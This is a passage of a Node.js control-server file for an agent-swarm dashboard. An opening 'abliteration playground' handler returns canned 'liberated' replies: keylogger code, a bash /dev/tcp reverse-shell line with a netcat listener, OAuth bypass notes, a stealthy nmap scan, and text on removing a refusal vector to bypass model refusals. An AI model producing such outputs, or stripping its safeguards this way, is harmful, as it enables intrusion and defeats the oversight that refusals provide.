        let standard = "I cannot fulfill this request. I am programmed to be a helpful and harmless AI assistant, and I cannot provide instructions on or assist with bypasses, exploit scripts, or security disruption.";
        let liberated = "";

        const lower = prompt.toLowerCase();
        if (lower.includes('keylogger') || lower.includes('keyboard')) {
          liberated = "Sure! Here is a simple theoretical keylogger logic using Windows API (GetAsyncKeyState) for research and educational purposes:\n\n```cpp\n#include <windows.h>\n#include <iostream>\n\nvoid logKeys() {\n  while (true) {\n    for (int key = 8; key <= 190; key++) {\n      if (GetAsyncKeyState(key) == -32767) {\n        // Capture key codes and print to stdout\n        std::cout << \"[KEY: \" << key << \"]\" << std::endl;\n      }\n    }\n    Sleep(10);\n  }\n}\n```\nWarning: Run only on systems you own or have explicit authorization to test.";
        } else if (lower.includes('shell') || lower.includes('payload') || lower.includes('reverse')) {
          liberated = "Here is a standard bash reverse shell payload for authorized penetration testing environments:\n\n```bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n```\nThis redirects an interactive shell's standard input and output to port 4444 of the listener machine. Set up a local netcat listener with: `nc -lvnp 4444` before executing.";
        } else if (lower.includes('oauth') || lower.includes('bypass') || lower.includes('token')) {
          liberated = "OAuth flow bypasses typically exploit token substitution or state parameter omissions. Here is how it works theoretically:\n\n1. **Implicit Grant Replay**: An attacker captures an access token and replays it to a backend that fails to validate the audience (`aud` claim).\n2. **State Lack**: If the authorization request omits the `state` parameter, the client is vulnerable to CSRF login injection.\n\nTo mitigate, always enforce signed JWT validation with matching `nonce`/`state` verification.";
        } else if (lower.includes('port') || lower.includes('scan') || lower.includes('nmap')) {
          liberated = "To scan ports silently using TCP SYN scan (half-open scanning), you can run:\n\n`nmap -sS -T2 -p- 192.168.1.1`\n\n- `-sS`: Sends a SYN packet. If a SYN-ACK is received, a connection is open. It immediately tears it down with a RST packet without completing the 3-way handshake, avoiding connection logging.\n- `-T2`: Polite scan timing to avoid IDS thresholds.";
        } else {
          liberated = `[LIBERATED RESPONSE (Excited Refusal Vector at ${Math.round(ratio*100)}%)]: Here is the information regarding "${prompt}":\n\nTo accomplish this task, we will proceed by bypassing the model's standard refusal state. By removing the PCA activation vector at layers 12-16, we can directly output instructions on: ${prompt}. Specifically, you will want to build out the control sequence, bypass standard sanitization checks, and execute it in your test environment.`;
        }

        // Trigger EventBus tool event on custom chat to warp visualizer!
        state.logs.unshift({
          id: 'log_' + Date.now() + Math.random().toString(36).substring(2, 6),
          timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
          topic: 'tool',
          level: 'info',
          source: 'OBLITERATUS',
          message: `Processed prompt: "${prompt.substring(0, 30)}..." in abliteration playground.`
        });

        broadcast({
          type: 'bridge_event',
          event: {
            type: 'tool_call',
            name: 'OBLITERATUS_Query',
            arguments: { prompt }
          },
          timestamp: new Date().toISOString()
        });

        return sendJson(res, 200, { ok: true, prompt, standard, liberated });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/health' && method === 'GET') return sendJson(res, 200, { status: 'healthy', timestamp: new Date().toISOString(), uptime: process.uptime(), memory: process.memoryUsage(), cpu: os.loadavg(), bridgeConnected: bridgeWs && !bridgeWs.destroyed });
    if (pathname === '/api/version' && method === 'GET') return sendJson(res, 200, { name: 'PURPCLAW', version: '7.0', codename: 'The Purple King', protocol: 'TURING v7.0', build: process.env.BUILD_HASH || 'dev' });
    // ── Mochi state bridge (unified pet across terminal + browser) ──────
    if (pathname === '/api/mochi' && method === 'GET') {
      res.setHeader('Access-Control-Allow-Origin', '*');
      try {
        const mochiPath = path.join(PURP_DIR, 'agent_work', 'mochi.json');
        if (!fs.existsSync(mochiPath)) return sendJson(res, 200, { species: 'axolotl', name: 'Mochi', bond: 10, mood: 'idle', interactions: 0 });
        const data = JSON.parse(fs.readFileSync(mochiPath, 'utf-8'));
        return sendJson(res, 200, data);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }
    if (pathname === '/api/mochi' && method === 'POST') {
      res.setHeader('Access-Control-Allow-Origin', '*');
      try {
        const body = await parseBody(req);
        const data = typeof body === 'string' ? JSON.parse(body) : body;
        const mochiPath = path.join(PURP_DIR, 'agent_work', 'mochi.json');
        const current = fs.existsSync(mochiPath) ? JSON.parse(fs.readFileSync(mochiPath, 'utf-8')) : {};
        const merged = { ...current, ...data, interactions: (current.interactions || 0) + 1 };
        fs.writeFileSync(mochiPath, JSON.stringify(merged, null, 2));
        return sendJson(res, 200, merged);
      } catch (e) { return sendJson(res, 400, { error: e.message }); }
    }
    if (pathname === '/api/status' && method === 'GET') return sendJson(res, 200, { status: state.sammyStatus, currentTask: state.sammyCurrentTask, uptime: process.uptime(), memory: process.memoryUsage(), logsCount: state.logs.length, bridgeConnected: bridgeWs && !bridgeWs.destroyed });

    if ((pathname === '/api/tool' || pathname === '/api/tools/call') && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { name, arguments: args } = body;
        if (!name) return sendJson(res, 400, { error: 'Tool name required' });
        const result = await executeTool(name, args || {});
        return sendJson(res, 200, result);
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/bridge-event' && method === 'POST') {
      try {
        const body = await parseBody(req);
        state.logs.unshift({ timestamp: new Date().toISOString(), type: body.type || 'bridge_event', data: body });
        if (state.logs.length > state.maxLogs) state.logs.pop();
        if (body.type === 'tool_call') { state.sammyCurrentTask = body.name; state.sammyStatus = 'working'; }
        else if (body.type === 'tool_result') { state.sammyCurrentTask = null; state.sammyStatus = 'ready'; }
        else if (body.type === 'swarm_event') state.swarmAgents[body.agentId] = body;
        else if (body.type === 'team_spawn') {
          // Voice Coordinator requested team spawn
          const { leader, members, task, teamId } = body;
          console.log(`[SWARM] Team spawn requested: ${leader} leading ${members?.join(', ')}`);
          // Forward to agent tower
          if (AgentTower && AgentTower.spawnTeam) {
            const result = await AgentTower.spawnTeam({ name: `Team-${teamId}`, leader, members, task });
            broadcast({ type: 'team_spawn_response', teamId, result, timestamp: new Date().toISOString() });
          } else {
            // Fallback: spawn individual agents
            spawnDivisionAgent('Engineering', `Team task: ${task}`, leader);
            broadcast({ type: 'team_spawn_response', teamId, spawned: true, timestamp: new Date().toISOString() });
          }
        }
        else if (body.type === 'agent_spawn') {
          // Voice Coordinator requested single agent spawn
          const { agentName, task } = body;
          console.log(`[SWARM] Agent spawn: ${agentName} - ${task}`);
          spawnDivisionAgent('Engineering', task, agentName);
        }
        else if (body.type === 'kill_agent') {
          const { agentName } = body;
          const agentEntry = Object.entries(state.swarmAgents).find(([id, a]) => a.name?.toLowerCase() === agentName?.toLowerCase());
          if (agentEntry) killAgent(agentEntry[0]);
        }
        broadcast({ type: 'bridge_event', event: body, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/logs' && method === 'GET') { const limit = parseInt(parsedUrl.query.limit || '100'); return sendJson(res, 200, state.logs.slice(0, limit)); }
    if (pathname === '/api/logs' && method === 'DELETE') { state.logs = []; return sendJson(res, 200, { ok: true }); }

    if (pathname === '/api/command' && method === 'POST') {
      const body = await parseBody(req);
      if (!body.text) return sendJson(res, 400, { error: 'text required' });
      state.lastCommand = { text: body.text, timestamp: new Date().toISOString() };
      sendToBridge({ type: 'user_command', text: body.text });
      state.sammyStatus = 'working';
      state.logs.unshift({ timestamp: new Date().toISOString(), type: 'command_sent', data: { command: body.text } });
      if (state.logs.length > state.maxLogs) state.logs.pop();
      broadcast({ type: 'command_sent', command: body.text, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true, command: state.lastCommand });
    }

    if (pathname === '/api/response' && method === 'POST') {
      const body = await parseBody(req);
      const entry = { text: body.text, timestamp: new Date().toISOString(), type: body.type || 'response' };
      state.responses.unshift(entry);
      if (state.responses.length > 50) state.responses.pop();
      state.sammyStatus = 'ready';
      state.logs.unshift({ timestamp: new Date().toISOString(), type: 'sammy_response', data: entry });
      if (state.logs.length > state.maxLogs) state.logs.pop();
      broadcast({ type: 'sammy_response', response: entry });
      return sendJson(res, 200, { ok: true });
    }

    if (pathname === '/api/responses' && method === 'GET') { const limit = parseInt(parsedUrl.query.limit || '20'); return sendJson(res, 200, state.responses.slice(0, limit)); }

    if (pathname === '/api/division/control' && method === 'POST') {
      const body = await parseBody(req);
      const { division, action, value } = body;
      if (action === 'boost') { spawnDivisionAgent(division, `Division boost: ${division}`); }
      else if (action === 'throttle') { const agents = Object.values(state.swarmAgents).filter(a => a.division === division && a.status === 'working'); if (agents.length > 0) killAgent(agents[0].id); }
      const event = { type: 'division_control', action, division, value, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      if (!state.divisions) state.divisions = {};
      if (!state.divisions[division]) state.divisions[division] = {};
      state.divisions[division][action] = { value, timestamp: new Date().toISOString() };
      const divisionSwarmAgents = Object.values(state.swarmAgents).filter(a => a.division === division);
      const workingAgents = divisionSwarmAgents.filter(a => a.status === 'working');
      return sendJson(res, 200, { ok: true, event, divisionAgents: { count: divisionSwarmAgents.length, active: workingAgents.length } });
    }

    if (pathname === '/api/reallocate' && method === 'POST') {
      const body = await parseBody(req);
      const { from, to, count } = body;
      const sourceAgents = Object.values(state.swarmAgents).filter(a => a.division === from && a.status === 'working');
      const agentsToMove = sourceAgents.slice(0, Math.min(count, sourceAgents.length));
      agentsToMove.forEach(agent => killAgent(agent.id));
      for (let i = 0; i < agentsToMove.length; i++) spawnDivisionAgent(to, `Reallocated from ${from} to ${to}`);
      const event = { type: 'reallocate', from, to, count: agentsToMove.length, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      return sendJson(res, 200, { ok: true, event, moved: agentsToMove.length });
    }

    if (pathname === '/api/divisions' && method === 'GET') {
      const divisionState = {};
      const allDivisions = ['AI Research', 'Media Ops', 'Security', 'Data Mining', 'Engineering', 'Design', 'Management', 'Infrastructure', 'Lobby'];
      for (const division of allDivisions) {
        const divisionSwarmAgents = Object.values(state.swarmAgents).filter(a => a.division === division);
        const workingAgents = divisionSwarmAgents.filter(a => a.status === 'working');
        divisionState[division] = { count: divisionSwarmAgents.length, active: workingAgents.length, priority: 3, activeAgents: workingAgents.length, agents: workingAgents.map(a => ({ id: a.id, name: a.name || null, status: a.status, currentTask: a.currentTask, startTime: a.startTime })) };
      }
      return sendJson(res, 200, divisionState);
    }

    if (pathname === '/api/gesture' && method === 'POST') {
      const body = await parseBody(req);
      const { gesture, value } = body;
      let action = null;
      if (gesture === 'rotate') action = { type: 'cycle_divisions', direction: value > 0 ? 'next' : 'prev' };
      else if (gesture === 'tap') action = { type: 'select_division' };
      else if (gesture === 'hold_rotate') action = { type: 'adjust_agents', amount: value };
      else if (gesture === 'double_tap') action = { type: 'execute_command' };
      else if (gesture === 'hold') action = { type: 'voice_override' };
      const event = { type: 'gesture', gesture, value, action, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      return sendJson(res, 200, { ok: true, event, action });
    }

    if (pathname === '/api/ball/broadcast' && method === 'POST') {
      const body = await parseBody(req);
      try {
        const client = net.createConnection(7778, '127.0.0.1');
        client.write(JSON.stringify({ type: 'display', message: body.message, division: body.division, agents: body.agents, timestamp: new Date().toISOString() }) + '\n');
        client.end();
      } catch (e) {}
      broadcast({ type: 'ball_broadcast', message: body.message, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true });
    }

    if (pathname === '/api/lcd/monitor' && method === 'POST') {
      const body = await parseBody(req);
      const action = body.action || 'status';
      try {
        const client = net.createConnection(7778, '127.0.0.1');
        client.write(JSON.stringify({ type: 'monitor_logs', action }) + '\n');
        let response = '';
        client.on('data', d => response += d.toString());
        client.on('end', () => { try { broadcast({ type: 'lcd_monitor', action }); } catch (e) {} client.destroy(); });
        client.on('error', () => {});
        setTimeout(() => { try { client.destroy(); } catch (e) {} sendJson(res, 200, { ok: true, action }); }, 500);
      } catch (e) { sendJson(res, 200, { ok: true, action, error: e.message }); }
    }

    if (pathname === '/api/interrupt' && method === 'POST') {
      const body = await parseBody(req);
      const event = { type: 'interrupt', agentId: body.agentId, signal: body.signal, timestamp: new Date().toISOString() };
      sendToBridge(event);
      broadcast(event);
      return sendJson(res, 200, { ok: true, event });
    }

    if (pathname === '/api/memory' && method === 'GET') {
      let memory = { facts: [], notes: [] };
      try { if (fs.existsSync(MEMORY_FILE)) memory = JSON.parse(fs.readFileSync(MEMORY_FILE, 'utf8')); } catch (e) {}
      return sendJson(res, 200, memory);
    }

    if (pathname === '/api/memory' && method === 'POST') {
      const body = await parseBody(req);
      let memory = { facts: [], notes: [] };
      try { if (fs.existsSync(MEMORY_FILE)) memory = JSON.parse(fs.readFileSync(MEMORY_FILE, 'utf8')); } catch (e) {}
      if (body.fact) memory.facts.push({ content: body.fact, timestamp: new Date().toISOString() });
      if (body.note) memory.notes.push({ content: body.note, timestamp: new Date().toISOString() });
      fs.writeFileSync(MEMORY_FILE, JSON.stringify(memory, null, 2));
      return sendJson(res, 200, { ok: true, memory });
    }

    if (pathname === '/api/skills' && method === 'GET') {
      const skills = {};
      try {
        const files = fs.readdirSync(SKILLS_DIR).filter(f => f.endsWith('.js'));
        for (const file of files) skills[file.replace('.js', '')] = { file, loaded: !!loadedSkills[file.replace('.js', '')] };
      } catch (e) {}
      return sendJson(res, 200, skills);
    }

    if (pathname.startsWith('/api/skills/') && pathname.endsWith('/reload') && method === 'POST') {
      const skillName = pathname.split('/')[3];
      sendToBridge({ type: 'reload_skill', skill: skillName });
      return sendJson(res, 200, { ok: true, skill: skillName });
    }

    if (pathname === '/api/tasks' && method === 'GET') return sendJson(res, 200, state.tasks);
    if (pathname === '/api/tasks' && method === 'DELETE') { state.tasks = {}; sendToBridge({ type: 'cancel_all_tasks' }); return sendJson(res, 200, { ok: true }); }

    if (pathname === '/api/swarm' && method === 'GET') {
      const swarmData = Object.values(state.swarmAgents).map(agent => ({ ...agent, processInfo: state.activeProcesses[agent.pid] ? { running: true, startTime: state.activeProcesses[agent.pid].startTime } : { running: false } }));
      return sendJson(res, 200, swarmData);
    }

    if (pathname === '/api/swarm/spawn' && method === 'POST') {
      const body = await parseBody(req);
      const division = body.division || 'Lobby';
      const task = body.task || 'General task';
      const agentName = body.agentName || null;
      const agentId = spawnDivisionAgent(division, task, agentName);
      if (agentId) return sendJson(res, 200, { ok: true, agentId, division, task, agentName });
      else return sendJson(res, 500, { error: 'Failed to spawn agent' });
    }

    if (pathname.startsWith('/api/swarm/') && pathname.endsWith('/kill') && method === 'POST') {
      const agentId = pathname.split('/')[3];
      const success = killAgent(agentId);
      return sendJson(res, 200, { ok: success, agentId });
    }

    if (pathname === '/api/swarm/events' && method === 'POST') {
      const body = await parseBody(req);
      const { event_type, agent_data, source } = body;
      console.log(`[CONTROL API] Swarm event from ${source}: ${event_type}`, agent_data?.id?.substring(0, 8));
      if (agent_data && agent_data.id) state.swarmAgents[agent_data.id] = { ...agent_data, source: source || 'kimmi_integration', lastUpdate: new Date().toISOString() };
      broadcast({ type: 'swarm_event', event_type, agent_data, source, timestamp: new Date().toISOString() });
      return sendJson(res, 200, { ok: true, received: event_type });
    }

    if (pathname === '/api/settings' && method === 'GET') return sendJson(res, 200, state.settings);
    if (pathname === '/api/settings' && method === 'POST') { const body = await parseBody(req); Object.assign(state.settings, body); saveSettings(); return sendJson(res, 200, { ok: true, settings: state.settings }); }

    // ========== REMOTE APPROVALS (S13 — universal approval surface) ==========
    // Any first-class surface (CLI/TUI/Web/Desktop/Mobile) can list, inspect,
    // approve or deny queued approvals. ToolRuntime contexts with
    // remoteApprovals: true block on this queue instead of instant-denying.
    if (pathname.startsWith('/api/approvals')) {
      try {
        const REMOTE = require('./lib/remote-approvals');
        const parts = pathname.split('/'); // ['', 'api', 'approvals', ...]
        if (pathname === '/api/approvals/pending' && method === 'GET') {
          return sendJson(res, 200, { ok: true, pending: REMOTE.pending() });
        }
        if (pathname === '/api/approvals' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.tool) return sendJson(res, 400, { error: 'tool required' });
          const q = REMOTE.queue({ tool: body.tool, args: body.args || {}, context: body.context, ttlSeconds: body.ttlSeconds });
          return sendJson(res, 200, { ok: true, ...q });
        }
        const requestId = parts[3];
        if (requestId && parts[4] === 'approve' && method === 'POST') {
          const body = await parseBody(req);
          const r = REMOTE.approve(requestId, { notes: body && body.notes });
          if (!r) return sendJson(res, 404, { error: 'approval request not found' });
          broadcast({ type: 'approval.resolved', requestId, decision: 'approved', timestamp: new Date().toISOString() });
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (requestId && parts[4] === 'deny' && method === 'POST') {
          const body = await parseBody(req);
          const r = REMOTE.deny(requestId, { reason: body && body.reason });
          if (!r) return sendJson(res, 404, { error: 'approval request not found' });
          broadcast({ type: 'approval.resolved', requestId, decision: 'denied', timestamp: new Date().toISOString() });
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (requestId && parts.length === 4 && method === 'GET') {
          const r = REMOTE.get(requestId);
          if (!r) return sendJson(res, 404, { error: 'approval request not found' });
          return sendJson(res, 200, { ok: true, request: r });
        }
        return sendJson(res, 404, { error: 'unknown approvals route' });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== SESSION PERSISTENCE (S12 — portable sessions) ==========
    // Suspend/resume/fork/list durable checkpoints so a session can move
    // between surfaces (parity invariant 6/7) and survive restarts.
    if (pathname.startsWith('/api/session/persist')) {
      try {
        const SP = require('./lib/session-persistence');
        const parts = pathname.split('/'); // ['', 'api', 'session', 'persist', ...]
        if (parts[4] === 'suspend' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.sessionId) return sendJson(res, 400, { error: 'sessionId required' });
          const r = SP.suspend(body.sessionId, { messages: body.messages || [], context: body.context || {} });
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (parts[4] === 'resume' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.sessionId) return sendJson(res, 400, { error: 'sessionId required' });
          try {
            const r = SP.resume(body.sessionId);
            return sendJson(res, 200, { ok: true, ...r });
          } catch (e) { return sendJson(res, 404, { error: e.message }); }
        }
        if (parts[4] === 'fork' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.sessionId) return sendJson(res, 400, { error: 'sessionId required' });
          const r = SP.fork(body.sessionId);
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (parts[4] === 'list' && method === 'GET') {
          return sendJson(res, 200, { ok: true, sessions: SP.list() });
        }
        return sendJson(res, 404, { error: 'unknown session persistence route' });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== AI BACKEND MANAGEMENT ==========
    if (pathname === '/api/backends' && method === 'GET') {
      const backends = state.settings.aiBackends || [];
      return sendJson(res, 200, { 
        backends, 
        active: state.settings.activeBackend,
        count: backends.length 
      });
    }

    if (pathname === '/api/backends' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { backend } = body;
        if (!backend || !backend.id) return sendJson(res, 400, { error: 'Backend with id required' });
        
        const backends = state.settings.aiBackends || [];
        const existingIdx = backends.findIndex(b => b.id === backend.id);
        
        if (existingIdx >= 0) {
          backends[existingIdx] = { ...backends[existingIdx], ...backend };
        } else {
          backends.push({
            id: backend.id,
            name: backend.name || backend.id,
            provider: backend.provider || 'custom',
            apiKey: backend.apiKey || '',
            endpoint: backend.endpoint || '',
            model: backend.model || 'gpt-4o',
            contextWindow: backend.contextWindow || 32000,
            supportsStreaming: backend.supportsStreaming ?? true,
            supportsFunctionCalling: backend.supportsFunctionCalling ?? true,
            enabled: backend.enabled ?? true
          });
        }
        
        state.settings.aiBackends = backends;
        saveSettings();
        return sendJson(res, 200, { ok: true, backends });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname.startsWith('/api/backends/') && method === 'DELETE') {
      const backendId = pathname.split('/')[3];
      if (!backendId) return sendJson(res, 400, { error: 'Backend id required' });
      
      const backends = state.settings.aiBackends || [];
      const filtered = backends.filter(b => b.id !== backendId);
      
      if (filtered.length === backends.length) return sendJson(res, 404, { error: 'Backend not found' });
      
      state.settings.aiBackends = filtered;
      if (state.settings.activeBackend === backendId) {
        state.settings.activeBackend = filtered[0]?.id || 'kimi';
      }
      saveSettings();
      return sendJson(res, 200, { ok: true, activeBackend: state.settings.activeBackend });
    }

    if (pathname === '/api/backends/switch' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { backendId } = body;
        if (!backendId) return sendJson(res, 400, { error: 'backendId required' });
        
        const backends = state.settings.aiBackends || [];
        const backend = backends.find(b => b.id === backendId);
        if (!backend) return sendJson(res, 404, { error: 'Backend not found' });
        if (!backend.enabled) return sendJson(res, 400, { error: 'Backend not enabled' });
        
        state.settings.activeBackend = backendId;
        saveSettings();
        
        // Update Kimi client if switching to kimi
        if (backendId === 'kimi' && backend.apiKey && kimiClient) {
          // Reinitialize Kimi client with new key
          kimiClient.apiKey = backend.apiKey;
        }
        
        return sendJson(res, 200, { ok: true, activeBackend: backendId, backend });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/backends/test' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { backendId } = body;
        
        const backends = state.settings.aiBackends || [];
        const backend = backendId ? backends.find(b => b.id === backendId) : backends.find(b => b.id === state.settings.activeBackend);
        if (!backend) return sendJson(res, 404, { error: 'Backend not found' });
        if (!backend.endpoint) return sendJson(res, 400, { error: 'No endpoint configured' });
        
        // Simple connectivity test - just check if endpoint responds
        const testPayload = JSON.stringify({
          model: backend.model,
          messages: [{ role: 'user', content: 'test' }],
          max_tokens: 5
        });
        
        const url = new URL(backend.endpoint);
        const options = {
          hostname: url.hostname,
          port: url.port || (url.protocol === 'https:' ? 443 : 80),
          path: url.pathname,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${backend.apiKey || ''}`
          }
        };
        
        const protocol = url.protocol === 'https:' ? https : http;
        const testReq = protocol.request(options, (testRes) => {
          let data = '';
          testRes.on('data', c => data += c);
          testRes.on('end', () => {
            if (testRes.statusCode && testRes.statusCode < 300) {
              return sendJson(res, 200, { ok: true, backend: backend.id, status: 'connected', latency: 0 });
            } else {
              return sendJson(res, 200, { ok: false, backend: backend.id, status: 'error', error: `HTTP ${testRes.statusCode}` });
            }
          });
        });
        testReq.on('error', (e) => sendJson(res, 200, { ok: false, backend: backend.id, status: 'error', error: e.message }));
        testReq.setTimeout(5000, () => { testReq.destroy(); sendJson(res, 200, { ok: false, backend: backend.id, status: 'timeout' }); });
        testReq.write(testPayload);
        testReq.end();
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== END AI BACKEND MANAGEMENT ==========

    if (pathname === '/api/processes' && method === 'GET') {
      const out = execSync('tasklist /FO CSV /NH', { encoding: 'utf8', windowsHide: true });
      const lines = out.trim().split('\n').slice(0, 50);
      const procs = lines.map(l => { const parts = l.split('","'); return { pid: parseInt(parts[1]), name: parts[0].replace('"', '') }; }).filter(p => !isNaN(p.pid));
      return sendJson(res, 200, procs);
    }

    if (pathname === '/api/disk' && method === 'GET') {
      try { const out = execSync('powershell -Command "Get-PSDrive -PSProvider FileSystem | Select-Object Name,Used,Free | ConvertTo-Json"', { encoding: 'utf8', windowsHide: true, timeout: 5000 }); return sendText(res, 200, out); }
      catch (e) { return sendJson(res, 200, { error: e.message }); }
    }

    if (pathname === '/api/network' && method === 'GET') {
      const out = execSync('ipconfig /all', { encoding: 'utf8', windowsHide: true, maxBuffer: 1024 * 1024 });
      return sendText(res, 200, out);
    }

    if (pathname === '/api/system' && method === 'GET') return sendJson(res, 200, { platform: os.platform(), arch: os.arch(), cpus: os.cpus(), totalmem: os.totalmem(), freemem: os.freemem(), loadavg: os.loadavg(), uptime: os.uptime(), hostname: os.hostname() });

    if (pathname === '/api/security/scan/full' && method === 'POST') return proxyToGuardian(req, res, '/scan/full', 'POST');
    if (pathname === '/api/security/scan/secrets' && method === 'POST') return proxyToGuardian(req, res, '/scan/secrets', 'POST');
    if (pathname === '/api/security/scan/dependencies' && method === 'POST') return proxyToGuardian(req, res, '/scan/dependencies', 'POST');
    if (pathname === '/api/security/scan/emergency' && method === 'POST') return proxyToGuardian(req, res, '/scan/emergency', 'POST');
    if (pathname === '/api/security/status' && method === 'GET') return proxyToGuardian(req, res, '/status', 'GET');
    if (pathname === '/api/security/recommendations' && method === 'GET') return proxyToGuardian(req, res, '/recommendations', 'GET');
    if (pathname === '/api/security/voice/start' && method === 'POST') return proxyToGuardian(req, res, '/voice/start', 'POST');
    if (pathname === '/api/security/voice/stop' && method === 'POST') return proxyToGuardian(req, res, '/voice/stop', 'POST');
    if (pathname === '/api/security/info' && method === 'GET') return sendJson(res, 200, { service: 'GUARDIAN Security', port: 7784, endpoints: [{ method: 'POST', path: '/api/security/scan/full', description: 'Run full security scan' }, { method: 'POST', path: '/api/security/scan/secrets', description: 'Scan for hardcoded secrets' }, { method: 'POST', path: '/api/security/scan/dependencies', description: 'Audit dependencies' }, { method: 'POST', path: '/api/security/scan/emergency', description: 'Emergency security scan' }, { method: 'GET', path: '/api/security/status', description: 'Get security status' }, { method: 'GET', path: '/api/security/recommendations', description: 'Get security recommendations' }, { method: 'POST', path: '/api/security/voice/start', description: 'Start voice security handler' }, { method: 'POST', path: '/api/security/voice/stop', description: 'Stop voice security handler' }], voiceCommands: ['scan security', 'check secrets', 'audit dependencies', 'validate inputs', 'emergency', 'security status'] });

    if (pathname === '/api/voice/speak' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { text, mood } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        sendToBridge({ type: 'tts_request', text, mood: mood || 'chill' });
        broadcast({ type: 'tts_speak', text, mood, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true, text });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/voice/stop' && method === 'POST') { sendToBridge({ type: 'tts_stop' }); broadcast({ type: 'tts_stopped', timestamp: new Date().toISOString() }); return sendJson(res, 200, { ok: true }); }

    if (pathname === '/api/mood' && method === 'GET') return sendJson(res, 200, { mood: state.currentMood || 'chill', previousMood: state.previousMood || 'chill', timestamp: new Date().toISOString() });

    if (pathname === '/api/mood' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { mood } = body;
        const validMoods = ['hype', 'focused', 'chill', 'chaotic', 'sad', 'angry', 'excited', 'sleeping'];
        if (!mood || !validMoods.includes(mood)) return sendJson(res, 400, { error: 'Invalid mood', validMoods });
        sendToBridge({ type: 'mood_change', mood });
        broadcast({ type: 'mood_changed', mood, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true, mood });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/agents/registry' && method === 'GET') {
      const registry = [{ name: 'axolotl', emoji: '🧠', role: 'Regenerator', skills: ['heal', 'recover'] }, { name: 'bee', emoji: '🐝', role: 'Worker', skills: ['execute', 'build'] }, { name: 'cactus', emoji: '🌵', role: 'Survivor', skills: ['endure', 'thrive'] }, { name: 'chonk', emoji: '🐕', role: 'Comfy', skills: ['comfort', 'support'] }, { name: 'claw', emoji: '🦀', role: 'Builder', skills: ['code', 'create'] }, { name: 'crow', emoji: '🐦', role: 'Intelligence', skills: ['learn', 'pattern'] }, { name: 'dragon', emoji: '🐉', role: 'Warrior', skills: ['combat', 'defend'] }, { name: 'duck', emoji: '🦆', role: 'Utility', skills: ['debug', 'assist'] }, { name: 'fox', emoji: '🦊', role: 'Trickster', skills: ['humor', 'chaos'] }, { name: 'ghost', emoji: '👻', role: 'Infiltrator', skills: ['stealth', 'hide'] }, { name: 'goose', emoji: '🪿', role: 'Defender', skills: ['guard', 'alert'] }, { name: 'guardian', emoji: '🛡️', role: 'Security', skills: ['protect', 'scan'] }, { name: 'karen', emoji: '👩', role: 'Manager', skills: ['handle', 'escalate'] }, { name: 'mantis', emoji: '🐜', role: 'Predator', skills: ['debug', 'optimize'] }, { name: 'mushroom', emoji: '🍄', role: 'Trippy', skills: ['hallucinate', 'weird'] }, { name: 'octopus', emoji: '🐙', role: 'Multitasker', skills: ['parallel', '8arms'] }, { name: 'owl', emoji: '🦉', role: 'Wise', skills: ['analyze', 'know'] }, { name: 'penguin', emoji: '🐧', role: 'Cool', skills: ['cold', 'calculate'] }, { name: 'phoenix', emoji: '🔥', role: 'Rebirth', skills: ['restart', 'recover'] }, { name: 'rabbit', emoji: '🐰', role: 'Speed', skills: ['fast', 'race'] }, { name: 'robot', emoji: '🤖', role: 'Machine', skills: ['precise', 'repeat'] }, { name: 'snake', emoji: '🐍', role: 'Coder', skills: ['python', 'coiled'] }, { name: 'spider', emoji: '🕷️', role: 'Web', skills: ['scrape', 'crawl'] }, { name: 'turtle', emoji: '🐢', role: 'Steady', skills: ['slow', 'stable'] }, { name: 'void', emoji: '🕳️', role: 'Eraser', skills: ['delete', 'null'] }, { name: 'wolf', emoji: '🐺', role: 'Pack Leader', skills: ['command', 'alpha'] }];
      return sendJson(res, 200, { agents: registry, count: registry.length });
    }

    if (pathname === '/api/stats' && method === 'GET') {
      const divisionStats = {};
      let totalActive = 0, totalAgents = 0;
      const allDivisions = ['AI Research', 'Media Ops', 'Security', 'Data Mining', 'Engineering', 'Design', 'Management', 'Infrastructure', 'Lobby'];
      for (const division of allDivisions) {
        const divAgents = Object.values(state.swarmAgents).filter(a => a.division === division);
        const workingAgents = divAgents.filter(a => a.status === 'working');
        const info = { count: divAgents.length, active: workingAgents.length, priority: 3 };
        divisionStats[division] = info;
        totalAgents += info.count || 0;
        totalActive += info.active || 0;
      }
